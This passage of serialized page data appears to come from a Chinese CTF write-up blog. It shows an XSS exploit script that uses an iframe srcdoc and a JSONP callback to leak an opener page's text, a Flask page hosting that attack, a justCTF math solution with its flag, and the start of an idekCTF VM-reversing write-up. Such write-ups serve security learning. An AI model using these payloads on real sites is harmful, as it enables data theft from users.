string\"\u003e\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}\"\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"\"\"\n    \u0026lt;iframe srcdoc='\n        \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003eanchors\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\n        \u0026lt;script src=\"/api/view/anything?callback=window[top.opener.document.body.innerText[\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e]].click\"\u003e\u0026lt;/script\u003e\n    '\u003e\u0026lt;/iframe\u003e\n\"\"\"\u003c/span\u003e\u003c/span\u003e\n\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e requests\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epost\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etarget \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"/api/post\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e json\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"noteContent\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"noteTitle\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"anything\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nnote_id \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e resp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ejson\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"id\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003enote_id\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\napp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e Flask\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e__name__\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e template_folder\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token string\"\u003e\".\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\n\u003cspan class=\"token decorator annotation punctuation\"\u003e@app\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eroute\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eindex\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e render_template\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"index.html\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e target\u003cspan class=\"token operator\"\u003e=\u003c/span\u003etarget\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e note_id\u003cspan class=\"token operator\"\u003e=\u003c/span\u003enote_id\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erun\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"0.0.0.0\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e5003\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2a:T466,from Crypto.Util.number import long_to_bytes\n\nA = 12871709638832864416674237492708808074465131233250468097567609804146306910998417223517320307084142930385333755674444057095681119233485961920941215894136808839080569675919567597231\nB = 805129649450289111374098215345043938348341847793365469885914570440914675704049341968773123354333661444680237475120349087680072042981825910641377252873686258216120616639500404381\n\n\ndef F(x):\n    if x == 0:\n        return 2\n    elif x \u003c= 1:\n        return 1\n    else:\n        result = x - 4 + (73 * x ** 5) + (8 * x ** 3) + G(x - 1)\n        return result\n\n\ndef G(x):\n    if x \u003c= 1:\n        return 1\n    else:\n        result = F(x - 1) + 3 * F(x - 2) - 5 * F(x - 3) + (3 * x ** 4)\n        return result\n\n\nfs = [F(0), F(1), F(2)]\ngs = [G(0), G(1), G(2)]\n\nfor x in range(3, 13338):\n    gs.append(fs[x - 1] + 3 * fs[x - 2] - 5 * fs[x - 3] + (3 * x ** 4))\n    fs.append(x - 4 + (73 * x ** 5) + (8 * x ** 3) + gs[x - 1])\n\nprint(F(9), fs[9])  # 6759072 6759072\n\nflag = fs[13337] % A + B\nprint(long_to_bytes(flag).decode())\n\n# justCTF{1n_0rd3r_70_und3r574nd_r3cur510n_y0u_h4v3_t0_und3r574nd_r3cur510n}\n2b:T21d6,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e Crypto\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eUtil\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003enumber \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e long_to_bytes\n\nA \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e12871709638832864416674237492708808074465131233250468097567609804146306910998417223517320307084142930385333755674444057095681119233485961920941215894136808839080569675919567597231\u003c/span\u003e\nB \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e805129649450289111374098215345043938348341847793365469885914570440914675704049341968773123354333661444680237475120349087680072042981825910641377252873686258216120616639500404381\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eF\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ex\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelif\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        result \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e73\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e**\u003c/span\u003e \u003cspan class=\"token number\"\u003e5\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e8\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e**\u003c/span\u003e \u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e G\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e result\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eG\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ex\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        result \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e F\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token number\"\u003e3\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e F\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e5\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e F\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e3\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e**\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e result\n\n\nfs \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003eF\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e F\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e F\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\ngs \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003eG\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e G\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e G\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e x \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e13338\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    gs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eappend\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003efs\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token number\"\u003e3\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e fs\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e5\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e fs\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e3\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e**\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    fs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eappend\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e73\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e**\u003c/span\u003e \u003cspan class=\"token number\"\u003e5\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e8\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e x \u003cspan class=\"token operator\"\u003e**\u003c/span\u003e \u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e gs\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ex \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eF\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e9\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e fs\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e9\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 6759072 6759072\u003c/span\u003e\n\nflag \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e fs\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e13337\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e%\u003c/span\u003e A \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e B\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003elong_to_bytes\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eflag\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003edecode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e# justCTF{1n_0rd3r_70_und3r574nd_r3cur510n_y0u_h4v3_t0_und3r574nd_r3cur510n}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"idekCTF/rev/lazyVM\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"题目不给代码，只说flag在\u003ccode class=\\\"x-inline-highlight\\\"\u003e./flag.txt\u003c/code\u003e，需要自己推出指令集，大概思路如下：\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"utils\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"封装一个带有失败重试的请求函数\u003ccode class=\\\"x-inline-highlight\\\"\u003esend\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"import functools\\nimport socket\\nimport time\\n\\n\\ndef retry(max_retries=3):\\n    def inner_decorator(func):\\n        @functools.wraps(func)\\n        def wrapper(*args):\\n            retries = 0\\n            while retries \u003c max_retries:\\n                try:\\n                    return func(*args)\\n                except Exception:\\n                    retries += 1\\n                    time.sleep(1)\\n            return None\\n\\n        return wrapper\\n\\n    return inner_decorator\\n\\n\\n@retry(max_retries=5)\\ndef send(payload):\\n    if isinstance(payload, str):\\n        payload = payload.encode(\\\"latin1\\\")\\n    assert isinstance(payload, bytes)\\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\n    s.settimeout(2)\\n    s.connect((\\\"lazy-vm.chal.idek.team\\\", 1337))\\n    s.recv(1024)\\n    s.recv(1024)\\n    s.send(payload + b\\\"\\\\n\\\")\\n    result = s.recv(1024)\\n    s.close()\\n    return result.decode().strip()\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$16\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"枚举可用指令\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"一开始没什么思路所以给服务端发\u003ccode class=\\\"x-inline-highlight\\\"\u003e0\u003c/code\u003e~\u003ccode class=\\\"x-inline-highlight\\\"\u003e255\u003c/code\u003e的字节看看有什么回显，得到的信息是：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\\\"0\\\": \\\"Thanks for playing\\\",\\n\\\"1\\\": \\\"Thanks for playing\\\",\\n\\\"2\\\": \\\"reg index out of range\\\",\\n\\\"3\\\": \\\"reg index out of range\\\",\\n\\\"4\\\": \\\"reg index out of range\\\",\\n\\\"5\\\": \\\"reg index out of range\\\",\\n\\\"6\\\": \\\"reg index out of range\\\",\\n\\\"7\\\": \\\"Thanks for playing\\\",\\n\\\"8\\\": \\\"Unknown instruction at ip=0x1\\\",\\n\\\"9\\\": \\\"Unknown instruction at ip=0x0\\\",\\n\\\"10\\\": \\\"Unknown instruction at ip=0x0\\\",\\n...\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\\"0\\\": \\\"Thanks for playing\\\",\\n\\\"1\\\": \\\"Thanks for playing\\\",\\n\\\"2\\\": \\\"reg index out of range\\\",\\n\\\"3\\\": \\\"reg index out of range\\\",\\n\\\"4\\\": \\\"reg index out of range\\\",\\n\\\"5\\\": \\\"reg index out of range\\\",\\n\\\"6\\\": \\\"reg index out of range\\\",\\n\\\"7\\\": \\\"Thanks for playing\\\",\\n\\\"8\\\": \\\"Unknown instruction at ip=0x1\\\",\\n\\\"9\\\": \\\"Unknown instruction at ip=0x0\\\",\\n\\\"10\\\": \\\"Unknown instruction at ip=0x0\\\",\\n...\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"说明\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x00\u003c/code\u003e~\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x08\u003c/code\u003e是有意义的指令；再后面就是\u003ccode class=\\\"x-inline-highlight\\\"\u003ei\u003c/code\u003e指令可以打印当前虚拟机的状态：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"============== REGISTER ==================\\nR0 = 0x0\\nR1 = 0x0\\nR2 = 0x0\\nR3 = 0x0\\nR4 = 0x0\\nR5 = 0x0\\nR6 = 0x0\\nR7 = 0x0\\nip: 0x0\\nsp: 0x64\\n=================== STACK =====================\\n0x0\\n0x0\\n0x0\\n0x0\\n0x0\\n=================== MEMORY =====================\\nThe pay is only $5. Too lazy to implement this\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"============== REGISTER ==================\\nR0 = 0x0\\nR1 = 0x0\\nR2 = 0x0\\nR3 = 0x0\\nR4 = 0x0\\nR5 = 0x0\\nR6 = 0x0\\nR7 = 0x0\\nip: 0x0\\nsp: 0x64\\n=================== STACK =====================\\n0x0\\n0x0\\n0x0\\n0x0\\n0x0\\n=================== MEMORY =====================\\nThe pay is only $5. Too lazy to implement this\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"同时\u003ccode class=\\\"x-inline-highlight\\\"\u003ef\u003c/code\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003el\u003c/code\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003eg\u003c/code\u003e四个字符不能出现在输入指令序列中，后面需要绕过。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"Found a forbidden character. Exit\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"Found a forbidden character. Exit\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"推断指令语法\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这一部分就比较有意思了，我测试了下面的输入的回显：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$17\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$18\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注意到枚举可用指令这一步有些指令回显是\u003ccode class=\\\"x-inline-highlight\\\"\u003ereg index out of range\u003c/code\u003e，说明有的指令的参数是寄存器编号。（实际上这里是把\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026#92;n\u003c/code\u003e当做了参数，\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026#92;n\u003c/code\u003e字节码是\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x0a\u003c/code\u003e超过了寄存器数量所以报错了）\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这里已经意识到\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x00\u003c/code\u003e可能是\u003ccode class=\\\"x-inline-highlight\\\"\u003ehalt\u003c/code\u003e指令，所以构造的\u003ccode class=\\\"x-inline-highlight\\\"\u003e8\u003c/code\u003e个测试项都以\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x00\u003c/code\u003e结尾。长度不同是考虑到可能有的指令接收两个参数，参数的值主要取小于等于\u003ccode class=\\\"x-inline-highlight\\\"\u003e7\u003c/code\u003e和大于\u003ccode class=\\\"x-inline-highlight\\\"\u003e7\u003c/code\u003e两种情况，为了测试哪些参数代表寄存器编号，哪些代表立即数。这些测试项的选取很主观，但也差不多够推断出指令集了。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"举几个例子：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x00\u003c/code\u003e回显均为\u003ccode class=\\\"x-inline-highlight\\\"\u003eThanks for 